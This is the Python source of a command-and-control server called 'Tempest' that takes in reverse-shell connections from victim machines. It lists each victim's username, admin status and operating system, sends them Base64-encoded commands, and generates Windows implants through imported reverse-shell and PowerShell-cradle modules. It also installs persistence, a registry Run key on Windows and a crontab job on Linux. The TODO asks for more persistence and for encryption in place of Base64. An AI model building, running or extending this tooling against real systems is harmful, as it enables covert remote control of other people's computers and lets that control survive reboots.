from datetime import datetime
from menus import banner, help, bcolors
from prettytable import PrettyTable
from shells import reverseshell, cradles

import base64
import socket
import threading
import time
"""
TODO Somethings I can try out:
    * Add one additional persistence technique for Windows and Linux
    * Implement a static command option that drops you into a local shell to execute local commands
    * and then allow you to exit from that shell when finished
    * Research encryption libraries and implement it in place of the Base64 encoding

"""


BUFFER = 1024
PADDING_WIDTH = 3

# flags
STOP_SERVER = 1
RUN_SERVER = 0

WINDOWS_UID = 1
WINDOWS_PAYLOAD = 1
LINUX_PAYLOAD = 2

def comms_in(target_id):
    """ Handles all responses sent from a client back to
        the server.

    Args:
        target_id (int): The session ID returning a response to a server.

    Returns:
        string: The response from the client.
    """
    print('[+] Awaiting response...')
    response = target_id.recv(BUFFER).decode()
    response = base64.b64decode(response)
    response = response.decode().strip()
    return response

def comms_out(target_id, message):
    """ Sends commands from the server to a client.

    Args:
        target_id (int): The session ID to send the message to.
        message (string): The command to be sent to a client.
    """
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf8'))
    target_id.send(message.encode())

def target_comm(target_id, targets, num):
    """ Manages the command and traffic control.

    Args:
        target_id (int): The ID of the session being interacted with.
    """
    while True:
        message = input(bcolors.OKBLUE + f'{targets[num][3]}/{targets[num][1]}#> ' + bcolors.ENDC)

        if len(message) == 0:
            # user does not enter a message
            continue

        if message == 'help':
            pass
        else:
            comms_out(target_id, message)

            if message == 'background':
                break

            if message == 'exit':
                target_id.send(message.encode())
                target_id.close()
                targets[num][7] = bcolors.FAIL + 'Dead' + bcolors.ENDC
                break

            if message == 'persist':
                payload_name = input('[+]' + bcolors.BOLD + 'Enter the name of the payload to add to autorun: ' + bcolors.ENDC)

                if targets[num][6] == 1:
                    persist_cmd_1 = f'cmd.exe /c copy {payload_name} C:\\Users\Public'
                    persist_cmd_1 = base64.b64encode(persist_cmd_1.encode())
                    target_id.send(persist_cmd_1)

                    persist_cmd_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
                    persist_cmd_2 = base64.b64encode(persist_cmd_2.encode())
                    target_id.send(persist_cmd_2)

                    print(bcolors.WARNING + '[!] Run this command to clean up the registry:' + bcolors.BOLD + '\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v screendoor /f' + bcolors.ENDC)

                if targets[num][6] == 2:
                    persist_cmd_3 = f'echo "*/1 * * * * python3 /home/{targets[num][3]/payload_name}" | crontab -'
                    persist_cmd_3 = base64.b64encode(persist_cmd_3.encode())
                    target_id.send(persist_cmd_3)

                    print(bcolors.WARNING + '[+] Run this command to clean up the crontab: ' + bcolors.BOLD + '\n crontab -r')
                print(bcolors.OKGREEN + '[+] Persistence technique completed.' + bcolors.ENDC)

            else:
                response = comms_in(target_id)
                if response == 'exit':
                    print('[-] The client has terminated the session')
                    target_id.close()
                    break
                print(response)

def listener_handler():
    """Hosts the listener for the socket, binds the socket, accepts traffic, and then redirects that traffic."""
    sock.bind((host_ip, int(host_port)))
    print('[+] Awaiting connection from client...')
    sock.listen()
    t1 = threading.Thread(target = comms_handler)
    t1.start()

def comms_handler():
    """Directs traffic to where it needs to go and ensures that it is receiving it where needed."""
    while True:
        # ! WHY IS THIS NOT WORKING ON LINUX?
        if kill_flag == STOP_SERVER:
            break
        try:
            remote_target, remote_ip = sock.accept()

            username = remote_target.recv(BUFFER).decode()
            username = base64.b64decode(username).decode()

            admin = remote_target.recv(BUFFER).decode()
            admin = base64.b64decode(admin).decode()

            op_sys = remote_target.recv(BUFFER).decode()
            op_sys = base64.b64decode(op_sys).decode()

            if admin == WINDOWS_UID:
                # if target is Windows (UID = 1)
                is_admin = bcolors.OKGREEN + 'Yes' + bcolors.ENDC
            else:
                if  username == 'root':
                    # else if target is Linux (UID = 0)
                    is_admin = bcolors.OKGREEN + 'Yes' + bcolors.ENDC
                else:
                    is_admin = bcolors.FAIL + 'No' + bcolors.ENDC

            payload_val = WINDOWS_PAYLOAD if 'Windows' in op_sys else LINUX_PAYLOAD

            # get the time when the target client connects
            curr_time = time.strftime("%H:%M:%S", time.localtime())
            curr_date = datetime.now()
            datetime_record = (f"{curr_date.day}-{curr_date.month}-{curr_date.year} {curr_time}")

            # get the host name of the target client
            host_name = socket.gethostbyaddr(remote_ip[0])

            target_name = (f"{host_name[0]}@{remote_ip[0]}") if host_name is not None else remote_ip[0]
            targets.append([remote_target, target_name, datetime_record, username, is_admin, op_sys, payload_val, bcolors.OKGREEN + 'Active' + bcolors.ENDC])
            print(bcolors.OKGREEN + f'\n[+] Connection received from {target_name}\n' + bcolors.ENDC + 'Enter command $ ',end='')
        except:
            pass

if __name__ == '__main__':
    """Main function. This is the entry point into the program."""
    banner()
    targets = []
    kill_flag = RUN_SERVER
    listener_counter = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            command = input('Tempest>> ')

            if command == 'help':
                help()

            if command == 'listeners -g':
                host_ip = input('[+] Enter the IP to listen to: ')
                host_port = input('[+] Enter the port to listen on: ')
                listener_handler()
                listener_counter += 1

            if command == 'pshell_shell':
                cradles.powershell_cradle()

            if command == 'winplant py':
                if listener_counter > 0:
                    reverseshell.create_windows_payload(host_ip, host_port)
                else:
                    print(bcolors.WARNING + '[-] You cannot generate a Windows payload without an active listener' + bcolors.ENDC)

            if command == 'linuxplant py':
                if listener_counter > 0:
                    # reverseshell.create_linux_payload(host_ip, host_port)
                    print(bcolors.WARNING + '[-] This feature is not yet ready!')
                else:
                    print(bcolors.WARNING + '[-] You cannot generate a Linux payload without an active listener' + bcolors.ENDC)

            if command == 'exeplant':
                if listener_counter > 0:
                    print(bcolors.WARNING + '[-] This feature is not yet ready!')
                    # reverseshell.create_exe_payload(host_ip, host_port)
                else:
                    print(bcolors.WARNING + '[-] You cannot generate an exe payload without an active listener' + bcolors.ENDC)

            if command == 'exit':
                quit_message = input(bcolors.WARNING + '\n[+] Are you sure you want to quit? (y/n) ' + bcolors.ENDC)
                if quit_message == 'y':
                    len_targets = len(targets)
                    for target in targets:
                        if target[7] == 'Dead':
                            pass
                        else:
                            comms_out(target[0], 'exit')
                    kill_flag = 1
                    if listener_counter > 0:
                        sock.close()
                    break
                else:
                    continue

            if command.split(" ")[0] == 'kill':
                    try:
                        num = int(command.split(" ")[1])
                        target_id = (targets[num])[0]
                        if (targets[num])[7] == 'Active':
                            comms_out(target_id, 'exit')
                            targets[num][7] = 'Dead'
                            print(f'[+] Sessions {num} terminated.')
                        else:
                            print(bcolors.WARNING + '[-] You cannot interact with a dead session.' + bcolors.ENDC)
                    except (IndexError, ValueError):
                        print(bcolors.FAIL + f'[-] Session {num} does not exist.' + bcolors.ENDC)

            if command.split(" ")[0] == 'sessions':
                session_counter = 0

                # list sessions
                if command.split(" ")[1] == '-l' or command.split(" ")[1] == '--list':
                    print("")
                    sessions_table = PrettyTable()
                    sessions_table.field_names = [
                        bcolors.BOLD + 'Session' + bcolors.ENDC,
                        bcolors.BOLD + 'Status' + bcolors.ENDC,
                        bcolors.BOLD + 'Username' + bcolors.ENDC,
                        bcolors.BOLD + 'Admin' + bcolors.ENDC,
                        bcolors.BOLD + 'Target' + bcolors.ENDC,
                        bcolors.BOLD + 'Operating System' + bcolors.ENDC,
                        bcolors.BOLD + 'Connection Time' + bcolors.ENDC
                    ]

                    sessions_table.padding_width = PADDING_WIDTH

                    for target in targets:
                        # define variables for readability
                        status = target[7]
                        username = target[3]
                        admin = target[4]
                        host = target[1]
                        host_os = target[5]
                        connection_time = target[2]

                        sessions_table.add_row([session_counter, status, username, admin, host, host_os, connection_time])
                        session_counter += 1
                    print(sessions_table)
                    print("")

                # interact with individual sessions
                if command.split(" ")[1] == '-i' or command.split(" ")[1] == '--interact':
                    try:
                        num = int(command.split(" ")[2])
                        target_id = (targets[num])[0]

                        if 'Active' in (targets[num])[7]:
                            target_comm(target_id, targets, num)
                        else:
                            print(bcolors.WARNING + '[-] ' + 'WARNING: You cannot interact with a dead session' + bcolors.ENDC)
                    except IndexError:
                        print(bcolors.FAIL + f'[-] Session {num} does not exist.' + bcolors.ENDC)

        except KeyboardInterrupt:
            quit_message = input(bcolors.WARNING + '\n[-] Are you sure you want to quit? (y/n) ' + bcolors.ENDC)

            if quit_message == 'y':
                len_targets = len(targets)
                for target in targets:
                    if target[7] == 'Dead':
                        pass
                    else:
                        comms_out(target[0], 'exit')
                kill_flag = STOP_SERVER
                if listener_counter > 0:
                    sock.close()
                break
            else:
                continue

